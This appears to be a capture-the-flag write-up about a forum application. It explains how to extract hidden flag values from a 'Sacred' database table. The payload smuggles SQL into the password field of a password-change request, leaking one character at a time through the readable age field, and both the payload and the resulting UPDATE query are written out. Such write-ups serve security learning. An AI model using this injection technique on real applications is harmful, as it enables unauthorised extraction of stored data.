### Forum Source Code Analysis

Find the password change logic.

There is a `GET /profile/get` endpoint that returns the username and age.

The `fire/postgres/init-db.sql` file describes the `Sacred` table:

```sql
CREATE TABLE IF NOT EXISTS Sacred (
    artefact TEXT NOT NULL
);

INSERT INTO Sacred (artefact) VALUES ('⚡️'), ('${ARTIFACT_2}'), ('${ARTIFACT_3}');
```

### Flag Retrieval Strategy

We need to extract the values from the `Sacred` table.
To do this, insert an SQL injection into the `password` field so that:
- the user's password does not change, so we don't have to remember new passwords
- each call to `POST /profile/password` extracts the i-th character of the `artefact` field from the `Sacred` table
- the result is stored in the numeric `age` field, which can be read via `GET /profile/get`

For example, we can pass the following as the `password` value:

```
$user', age = (SELECT CAST(ascii(SUBSTRING(encode(artefact::bytea, 'hex'), $i, 1)) AS INTEGER) FROM Sacred LIMIT 1 OFFSET 2) -- 1
```

We convert the value we need to a hex string and store the code of the i-th character in the `age` field.

Then the SQL query after substituting the password looks like this:

```sql
UPDATE users SET password = '<password>', age = (SELECT CAST(ascii(SUBSTRING(encode(artefact::bytea, 'hex'), <position>, 1)) AS INTEGER) FROM Sacred LIMIT 1 OFFSET 2) -- 1'
WHERE username = $1"
```
